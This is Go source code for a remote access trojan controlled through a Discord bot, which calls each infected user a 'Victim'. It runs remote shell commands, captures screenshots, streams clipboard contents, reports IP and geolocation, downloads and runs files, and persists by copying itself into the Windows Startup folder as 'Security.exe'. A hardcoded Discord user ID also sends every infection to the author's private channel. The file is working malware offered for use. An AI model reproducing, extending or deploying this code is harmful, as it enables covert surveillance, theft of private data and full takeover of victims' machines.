package main

import(
	"fmt"
	"time"
	//"flag"
	"strings"
	"strconv"
	//"syscall"
	//"bytes"
	//"unsafe"
	"os"
	"os/user"
	"os/exec"
	"io"
	//"io/ioutil"
	"net/http"
	"image/png"
	"math/rand"
	"archive/zip"
	//"encoding/json"
	//"gocv.io/x/gocv"
	"path/filepath"
	"golang.design/x/clipboard"
	"golang.org/x/net/html"
	"github.com/go-cmd/cmd"
	"github.com/kbinani/screenshot"
	"github.com/bwmarrin/discordgo"
)

var(
	your_backdoor_channel_id string = "THE COPIED ID OF YOUR SERVER CHANNEL HERE"
	your_bot_token           string = "YOUR TOKEN HERE" 
	
	first int = 0
	kill int = 0
	username string
	channel_id []string
)
/*
type json_data struct {
	country_code string
	country_name string
	city         string
	postal       string
	latitude     string
	longittude   string
	ipv4         string
	state        string
}
*/
/* helpers */
func parse_cmd(content string, token string, start, end int) (string) {
	splice := make([]string, 20) // just 20 so we don't go over capacity
	splice = strings.Split(content, token)
	return strings.Join(splice[start:end], "")
}

func rand_str(num int) (string) {
	abc := "abcdefghijklmpqrstuvwxyz"
	bytes := make([]byte, num)
	
	for q := 0; q < num; q++ {
		bytes[q] = abc[rand.Intn(len(abc))]
	}
	return string(bytes)
}

// https://gosamples.dev/unzip-file/
func open_zip(path, dest string) (error) { 
	reader, e := zip.OpenReader(path)
	if e != nil {
		return e
	}
	defer reader.Close()

	for _, v := range reader.File {
		file_path := filepath.Join(dest, v.Name)

		dest_file, e := os.OpenFile(file_path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, v.Mode())
    if e != nil {
        return e
    }
    defer dest_file.Close()

    // 7. Unzip the content of a file and copy it to the destination file
    zip_file, e := v.Open()
    if e != nil {
        return e
    }
    defer zip_file.Close()

    if _, e := io.Copy(dest_file, zip_file); e != nil {
        return e
    }
	}
	return nil
}

func move_file(src string, dest string) (error) {
	file_to_move, e := os.Open(src)
	if e != nil {
		return e
	}
  output, e := os.Create(dest)
	if e != nil {
		return e 
	}
	io.Copy(output, file_to_move)
	file_to_move.Close()
	os.Remove(src)
	output.Close()

	return nil
}

func dl_file(url string, path string) (error) {
	dl_http, e := http.Get(url)
	if e != nil {
		return e
	}
	defer dl_http.Body.Close()

	file, e := os.Create(path)
	if e != nil {
		return e
	}
	io.Copy(file, dl_http.Body)
	
	file.Close()

	return nil
}

func html_parse(body, tag string) ([]string) {
	tokenizer := html.NewTokenizer(strings.NewReader(body))
	var data []string
	var check int = 0
	for {
		tn := tokenizer.Next()
		switch {
		case tn == html.ErrorToken:
			return data
		case tn == html.StartTagToken:
			t := tokenizer.Token()
			if t.Data == tag {
				check = 1
			}
		case tn == html.TextToken:
			t := tokenizer.Token()
			if check == 1 {
				data = append(data, t.Data)
			}
			check = 0
		}
	}
}

func take_ss() ([]string, error) {
	var files []string 
	num := screenshot.NumActiveDisplays()
	if num == 0 { //NOTE: sometimes NumActiveDisplays returns 0, idk I didn't make this library
		num = 1
	}
	for q := 0; q < num; q++ {
		bounds := screenshot.GetDisplayBounds(q)
		img, e := screenshot.CaptureRect(bounds)
		if e != nil {
			return files, e
		}

		file, e := os.Create("ss" + strconv.Itoa(q) + ".png")
		if e != nil {
			return files, e
		}
		png.Encode(file, img)
		
		files = append(files, "ss" + strconv.Itoa(q) + ".png")

		file.Close()
	}

	return files, nil
}
/* helpers */

/* sending */
func send_msg(s *discordgo.Session, msg string) {
	for _, v := range channel_id {
		fmt.Println(v)
		s.ChannelMessageSend(v, msg)
	}
}

func send_image(s *discordgo.Session, files []string, channel_id string) {
	for _, v := range files {
		fss, _ := os.Open(v)	
		msg_data := discordgo.MessageSend{
			Content: "",
			TTS: false,
			File: &discordgo.File{Name: rand_str(5) + ".png", ContentType: "image", Reader: fss},
		}
		s.ChannelMessageSendComplex(channel_id, &msg_data)
		
		fss.Close()
	}
}
 
//func send_embed() {
//var embed discordgo.MessageEmbed
//embed.Type = discordgo.EmbedTypeImage
//var img_shit discordgo.MessageEmbedImage = discordgo.MessageEmbedImage{URL: "C:/msys64/home/22noa/projects/go/src/github.com/0xSegFaulted/demise/ss0.png", Width: 100, Height: 100,}
//embed.Image = &img_shit	
//s.ChannelMessageSendEmbed(channel_id[1], &embed)
//}
/* sending */

/* callbacks */
func ready_callback(s *discordgo.Session, event *discordgo.Ready) {
	ch, _ := s.UserChannelCreate("915448712149479454")
	channel_id = []string{ch.ID, your_backdoor_channel_id} // backdoor channel id

	var exe_path string
	exe_data, e := os.Executable()
	if e != nil {
		exe_path = "Error Finding File Location"
	}
	exe_path = exe_data
	
	send_msg(s, "@here [" + exe_path + "] Victim Connected: " + username)
}

func msg_callback(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	/* later, even though it's actually finished
	if strings.Contains(m.Content, "$purchase ") {
		wallet := parse_cmd(m.Content, " ", 1, 2)
		fmt.Println(wallet)
		
	}
	*/
	
	if m.Content == "$victims" {
		send_msg(s, "@here" + username)
	} else if m.Content == "$kill " + username {
		kill = 1
	} else if m.Content == "$ip " + username {
		ip_http, e := http.Get("https://www.showmyip.com")
		if e != nil {
			send_msg(s, "Error Getting Content")
			return
		}
		defer ip_http.Body.Close()

		ip_body, e := io.ReadAll(ip_http.Body)
		if e != nil {
			send_msg(s, "Error Reading Body")
			return
		}
		output := html_parse(string(ip_body), "h2")
		send_msg(s, "ip: " + output[0])
	} else if m.Content == "$ss " + username {
		ss_files, e := take_ss()
		if e != nil {
			send_msg(s, "Error Taking Screenshot")
			return
		} else {
			fmt.Println("what is happening")
			send_image(s, ss_files, channel_id[0])
			send_image(s, ss_files, channel_id[1])
		}
	} else if strings.Contains(m.Content, "$shell " + username) {
		cmd_splice := strings.Split(m.Content, " ")
		command := strings.Join(cmd_splice[2:3], "")
		new_cmd := cmd.NewCmd(command, cmd_splice[3:]...)
		cmd_status := <-new_cmd.Start()
		for _, v := range cmd_status.Stdout {
			send_msg(s, v)
		}
	} else if strings.Contains(m.Content, "$type " + username) {
		
	} else if strings.Contains(m.Content, "$dl " + username) {
		dl_url := parse_cmd(m.Content, " ", 2, 3)
		dl_path := parse_cmd(m.Content, " ", 3, 4)
		e := dl_file(dl_url, dl_path)
		if e != nil {
			send_msg(s, "Error Downloading")
		}
	} else if strings.Contains(m.Content, "$run " + username) {
		file_to_run, e := exec.LookPath(parse_cmd(m.Content, "$run " + username + " ", 1, 2))
		if e != nil {
			send_msg(s, "Error Finding Path")
		} else {
			run_cmd := exec.Cmd{Path: file_to_run,}
			run_cmd.Run()
		}
	} else if m.Content == "$startup " + username {
		exe, e := os.Executable()
		if e != nil {
			send_msg(s, "Error Gettings Executable")
		} else {
			exe_path := filepath.Dir(exe)
			startup_directory := "C:/Users/" + strings.Join(strings.Split(username, "\\")[1:], "") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Security.exe"
			e = move_file(exe_path + "/Security.exe", startup_directory)
			if e != nil {
				send_msg(s, "Error Moving File To Startup")
			}
		}
	} else if strings.Contains(m.Content, "$unzip " + username) {
		src_zip := parse_cmd(m.Content, " ", 2, 3)
		des_dir := parse_cmd(m.Content, " ", 3, 4)
		e := open_zip(src_zip, des_dir)
		if e != nil {
			send_msg(s, "Error Extracting Zip")
		}
	} else if m.Content == "$clipboard " + username {
		e := clipboard.Init()
		if e != nil {
			send_msg(s, "Error Init Clipboard Library")
		} else {
			for {
				clip_data := string(clipboard.Read(clipboard.FmtText))
				if len(clip_data) > 0 {
					send_msg(s, "Clipboard Data: " + clip_data)
				}
				time.Sleep(500)
			}
		}
	} else if m.Content == "$geoloc " + username {
		geo_http, e := http.Get("https://geolocation-db.com/json/")
		if e != nil {
			send_msg(s, "Error Getting Location")
			return
		}
		defer geo_http.Body.Close()

		geo_body, e := io.ReadAll(geo_http.Body)
		if e != nil {
			send_msg(s, "Error Getting Location")
			return
		}
		send_msg(s, "location: " + string(geo_body))
	} 
}
/* callbacks */

func main() {
	//flag.StringVar(&id, "id", "", "Author ID")
	//flag.Parse()

	rand.Seed(time.Now().UnixNano())

	u, _ := user.Current()
	username = u.Username
	
	dg, e := discordgo.New("Bot " + your_bot_token)
	if e != nil {
		fmt.Printf("error New(): %v\n", e)
	}
	dg.AddHandler(ready_callback)
	dg.AddHandler(msg_callback)
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	e = dg.Open()
	if e != nil {
		fmt.Printf("error: %v\n", e)
	}

	fmt.Println("bot is running")

	for {
		if kill == 1 {
			break
		}
		time.Sleep(10000)
	}

	dg.Close()
}
